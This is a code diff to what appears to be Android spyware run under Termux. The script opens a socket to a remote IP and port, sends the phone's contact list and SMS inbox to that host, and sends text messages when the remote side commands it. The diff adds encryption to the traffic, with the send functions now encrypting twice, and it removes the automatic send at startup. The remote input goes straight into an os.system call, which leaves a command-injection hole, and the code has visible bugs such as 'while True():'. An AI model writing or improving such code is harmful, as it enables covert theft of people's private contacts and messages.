@@ -46,18 +46,15 @@ SOCKET.connect((IP, PORT))
 
 def sendcontacts():
     ContactsRaw = subprocess.Popen(['termux-contact-list'], stdout=subprocess.PIPE)
-    Contacts = bytes.decode(ContactsRaw.communicate()[0])
+    Contacts = encrypt(bytes.decode(ContactsRaw.communicate()[0]))
     SOCKET.send(bytes.encode(encrypt(Contacts)))
 
 
 def sendtexts():
     TextsRaw = subprocess.Popen(['termux-sms-inbox'], stdout=subprocess.PIPE)
-    Texts = bytes.decode(TextsRaw.communicate()[0])
+    Texts = encrypt(bytes.decode(TextsRaw.communicate()[0]))
     SOCKET.send(bytes.encode(encrypt(Texts)))
 
-
-sendcontacts()
-sendtexts()
 
 while True():
     DATA = SOCKET.recv(1024)
@@ -69,6 +66,6 @@ while True():
         sendtexts()
 
     if(DATA == 'send test'):
-        NUMBER = SOCKET.recv(1024)
-        MESSAGE = SOCKET.recv(1024)
+        NUMBER = decrypt(SOCKET.recv(1024))
+        MESSAGE = decrypt(SOCKET.recv(1024))
         os.system('termux-sms-send -n ' + NUMBER + ' ' + MESSAGE)
